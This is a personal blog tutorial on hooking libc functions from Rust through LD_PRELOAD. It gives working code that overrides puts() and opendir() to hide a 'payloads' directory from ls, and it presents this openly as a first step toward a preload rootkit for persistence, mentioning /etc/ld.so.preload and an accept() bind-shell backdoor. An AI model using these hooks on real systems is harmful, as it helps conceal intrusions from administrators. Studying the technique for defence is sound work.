---
title: "hooking libc 4 fun (in rust)"
date: 2024-04-07
# weight: 1
alias: ["hooking-libc"]
tags: ["libc", "hooking-libc", "rust"]
author: "ziggoon"
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "libc and rusty rootkits"
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
---
## libc
> when writing C access to libc is extremely straightforward. include the relevant header files in your source files and voila, you are in the world of libc. 

libc is the standard library for C that defines types and functions for use in C programs - there's a bunch of techincality about its standards, but thats not important nor do i care. this is generally distributed as a shared library (.so) on linux and loaded using static or dynamic linking. we'll get into that a bit more later.

let's start with the most basic example, outputting text to a console. in the following code snippet, `puts` is imported from `stdio.h` in libc and used to print a string to `stdout`

```
#include <stdio.h>

int main() {
    puts("hello from C\n");

    return 0;
}
```
```
gcc hello.c -o hello; ./hello
hello from C
```
---
## libc in rust?
> rust has its own standard library, why would we need to call libc? to hook functions for _fun_ of course

alright so now that we have a basic idea of how libc is used in C programs, let's take a look at what printing a string looks like using rust and its standard library. instead of including a header file, we can utilize the `println!` macro which is a default feature of the rust standard library.
```
fn main() {
    println!("hello from rust");
}
```
```
cargo run
   Compiling blog_ex v0.1.0 (/home/kali/blog_ex)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.69s
     Running `target/debug/blog_ex`
hello from rust
```

fun stuff, but not what we are here for. how can we call libc from rust? rust provides an interface for calling functions defined in other languages known as the [foreign function interface (FFI)](https://doc.rust-lang.org/nomicon/ffi.html). thankfully, there is a `libc` crate which provides bindings that we can use :)

using the `libc` crate, let's start by replicating our C example using libc instead of rust's standard lib.

1. create a new crate:
`cargo new libc_ex --bin`

2. add libc to dependencies:
`cargo add libc`

3. modify `main.rs`
```
use std::ffi::CString;
use std::os::raw::c_char;

extern "C" {
    fn puts(s: *const c_char) -> i32;
}

fn main() {
    let message = CString::new("hello from rust").unwrap();

    unsafe {
        puts(message.as_ptr());
    }
}
```
```
cargo run
   Compiling libc v0.2.153
   Compiling libc_ex v0.1.0 (/home/kali/libc_ex)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 2.48s
     Running `target/debug/libc_ex`
hello from rust
```

`puts()` was successfuly called from rust ٩(˘◡˘)۶ let's review what we just wrote before moving onto better things.

starting from the top, we imported the necessary C types, defined the function signature for `puts()` which will be used when cargo links the program against libc, defined the string to print, then called `puts()` with our defined string as an arg.

when we compile this program, the signature we created for `puts()` will be compiled into LLVM IR and linked against libc due to the `extern "C"` block. technically, the `"C"` part isn't necessary, but it forces the function to follow the C calling convention. lastly, all calls to libc functions (all foreign functions tbh) have to be wrapped in an `unsafe{}` block due to the fact they often violate the guarentees of rust's safety

## linking?
as mentioned earlier, libc is distributed as a shared library on linux and linked staticly or dynamically into programs. so what is the difference between static and dynamic linking? 
### static linking
static linking occurs during compilation time and loads the necessary library functions directly into the executable binary. for example, if we staticly linked the C program with the `puts()` example from earlier, `gcc` would compile the definitions straight into the binary. 
### dynamic linking
dynamic linking occurs during runtime and is performed by `ld-linux` which is the dynamic linker and loader for linux. taking a look at our C program, we can verify that is is dynamically linked using `/lib64/ld-linux-x86-64.so.2` 
```
hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4d6039bfcd77526e59344f97ac121a233b8ecae8, for GNU/Linux 3.2.0, not stripped
```

`ld-linux.so` aka `ld.so` is pretty based when you leverage it properly. let's take a look at the [man page](https://www.man7.org/linux/man-pages/man8/ld.so.8.html) for `ld.so`

```
There are various methods of specifying libraries to be 
preloaded, and these are handled in the following order:
        (1)  The LD_PRELOAD environment variable.

        (2)  The --preload command-line option when invoking the
                   dynamic linker directly.

        (3)  The /etc/ld.so.preload file (described below).
```
✨(っ◔︣◡◔᷅)っ **/etc/ld.so.preload** c(◕︣◡◕᷅c)✨

## dynamic linker abuse?
dynamically linked binaries will link against the libraries they utilize (like libc), but what happens if we provide a function definition that gets linked before the default linker? this is commonly known as _function hooking_

ok, so we want to hook a function. we'll need a definition for a function that is compiled into a shared library. let's continue using `puts()` as an example - we'll hook `puts()` to always print `hooked puts()` 

let's start building a library for this.
1. create new crate:
`cargo new hooked_puts --lib`

2. add libc to dependencies:
`cargo add libc`

3. set library type to `dylib` (dynamic library) in `Cargo.toml`
```
[package]
name = "hooked_puts"
version = "0.1.0"
edition = "2021"

[dependencies]
libc = "0.2.153"

[lib]
crate-type = ["dylib"]
```

4. at this stage, we can start writing the library code (e.g the `puts()` definition). it's pretty similar to the code we wrote earlier, except this time we are writing the definition of `puts()` instead of using it :)

the code is extremely simple:
```
use std::os::raw::{c_int, c_char};

#[no_mangle]
pub unsafe extern "C" fn puts(_s: *const c_char) -> c_int {
    println!("hooked puts()");

    return 0;
}
```
compile w/ optimizations and hello using LD_PRELOAD and our C program from earlier 
```
cargo build --release
   Compiling libc v0.2.153
   Compiling hooked_puts v0.1.0 (/home/kali/hooked_puts)
    Finished `release` profile [optimized] target(s) in 2.26s
```
```
LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
hooked puts()
```
(҂◡̀_◡́)ᕤ libc hooked. we are so back (kinda)

alright, well hooking `puts()` is cool and all, but it really serves zero purpose for establishing persistence. my inspiration for this research, [Father](https://github.com/mav8557/Father), provides some excellent examples of how to utilize libc hooking for persistence. while i wont cover the full process in this post, the content should get you rolling to build your own rootkit 4 funsiez.

## ls? never met her
everyone who has ever touched a linux box is familiar with `ls`. its used to list the contents of a directory, but how? great question reader! it uses libc functions (and syscalls but thats not important rn)

here is how `ls` works at a relatively low level:
1. open directory using libc's `opendir()`
2. read directory entries using libc's `readdir()`
3. retrieve file metadata using libc's `stat()` or `lstat()` or `statx()`
4. print to stdout with libc's `write()`

nice. we've already covered how to hook a libc function and return our own data. what if we want to hook the function and perform an action if a condition is met, otherwise execute the original function? we just retrieve the address of the original function and load it into our program during runtime

let's hop back to our `puts()` example to hook the function to print `no libc 4 u` if the string passed to puts matches `hello from C`. 

```
use std::os::raw::{c_int, c_char, c_void};
use std::ffi::CStr;

#[no_mangle]
pub unsafe extern "C" fn puts(s: *const c_char) -> c_int {
    let o_puts: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"puts\0".as_ptr() as *const _) };
    let o_puts: extern "C" fn(*const c_char) -> c_int = unsafe { std::mem::transmute(o_puts) };

    let cstr = unsafe { CStr::from_ptr(s) };
    if cstr.to_bytes() == "hello from C\n".as_bytes() {
        println!("no libc 4 u");
        return 0;
    }

    return o_puts(s);
}
```
```
LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
no libc 4 u
```

the code is pretty self-explanatory except for the first two lines of the function. simply put, those two lines load the original `puts()` function from libc into the process address space for usage within our rust program. 

awesome! we've successfully hooked the `puts()` function and changed it logic. let's verify that our code still calls the original function properly. lets change the string in the C source file, compile, then link against our malicious library.
```
gcc hello.c -o hello; ./hello
hello from C... maybe?
```
```
LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
hello from C.. maybe?
```

cool, that works as expected. let's move onto hooking some other functions with a goal of hiding directories and files. as previously mentioned, `ls` calls multiple libc functions to retrieve information about to contents of a directory. for brevity i will only cover to hooking on `opendir()` to hide a malicious directory `payloads`

the example code is almost 1:1 as the `puts()` example, except we must return a null pointer instead of a `c_int`. we will also need to utilize the `errno` crate to set the relevant variable `ENOENT` which indicates that there is no file or directory. you can add that to the crate using: `cargo add errno`
```
use errno::set_errno;
#[no_mangle]
pub extern "C" fn opendir(name: *const c_char) -> *mut FILE {
    let o_opendir: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"opendir\0".as_ptr() as *const _) };
    let o_opendir: extern "C" fn(*const c_char) -> *mut FILE = unsafe { std::mem::transmute(o_opendir) };

    let cstr = unsafe { CStr::from_ptr(name) };
    if cstr.to_bytes() == "payloads".as_bytes() {
        set_errno(errno::Errno(libc::ENOENT));
        return null_mut()
    }

    return o_opendir(name);
}
```

once we have the library compiled, we can verify the directory `payloads` exists on the filesystem and is accessible when using `ls` linked against libc. 
```
ls -la payloads
total 12
drwxr-xr-x 3 kali kali 4096 Apr  8 12:25 .
drwxr-xr-x 8 kali kali 4096 Apr  8 12:26 ..
drwxr-xr-x 2 kali kali 4096 Apr  8 12:25 test
-rw-r--r-- 1 kali kali    0 Apr  8 12:25 test.c
```

when running `ls` linked against our library, `payloads` is no longer
```
LD_PRELOAD=/home/kali/libhooked_puts.so ls -la payloads
ls: cannot open directory 'payloads': No such file or directory
```

## moving further
malicious function signatures delivered through dynamic preloading allow attackers to enable capabilities such as authentication sniffing, network connection and process masking, and various other techniques. a common technique for establishing persistence utilizing preload rootkits is by hooking `accept()` to accept connections on an arbitrary port, essentially creating a bind shell. this process is well documented in the this [blog](https://www.secureideas.com/blog/ldpreload-making-a-backdoor-by-hijacking-accept).

preload rootkits are super extensible depending on the enagement requirements. one public example that illustrates the capabilities of a well-developed rookit is [medusa](https://github.com/ldpreload/Medusa). unfortuantely, using the dynamic loader through `LD_PRELOAD` or `/etc/ld.so.preload` as a persistence method is well documented: mitre technique: `T1574.006`

fortunately, for attackers, preload rootkits are not the only method of deep persistence on linux systems. one of my personal favorite examples that utilizes eBPF, with i would like to explore using [aya](https://github.com/aya-rs/), is [epfkit](https://github.com/Gui774ume/ebpfkit).

until next time ≧◠‿◠≦✌

sources: \
https://doc.rust-lang.org/nomicon/ffi.html

https://www.man7.org/linux/man-pages/man8/ld.so.8.html

https://www.secureideas.com/blog/ldpreload-making-a-backdoor-by-hijacking-accept
 
https://attack.mitre.org/techniques/T1574/006/ 

https://github.com/mav8557/Father

https://github.com/ldpreload/Medusa

https://github.com/Gui774ume/ebpfkit

https://github.com/aya-rs/
